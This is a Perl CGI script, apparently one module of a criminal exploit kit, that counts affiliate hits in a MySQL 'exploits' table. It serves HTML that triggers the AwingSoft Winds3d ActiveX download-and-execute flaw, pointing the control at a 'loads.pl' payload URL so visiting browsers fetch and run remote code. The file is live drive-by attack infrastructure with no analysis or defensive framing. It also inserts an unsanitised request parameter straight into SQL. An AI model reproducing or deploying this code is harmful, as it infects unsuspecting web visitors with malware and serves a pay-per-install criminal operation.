#!/usr/bin/perl

#
# var randomizer for Winds3d download / execute Activex exploit (Universal)
#  NOT FUD
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET winds3d=winds3d+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET winds3d=winds3d+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Build url
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=winds3d';

#html data
$html = <<EOF;

<html>
<body>
<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903' 
codebase='http://www.awingsoft.com/zips/WindsPly.CAB'>
<param name="SceneURL" value="$urlllll#">
<embed type="application/x-awingsoft-winds3d" src="$urlllll">
</object>

EOF


###### BEGIN PRINT EXPLOIT #########
print $q->header;

print $html;

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
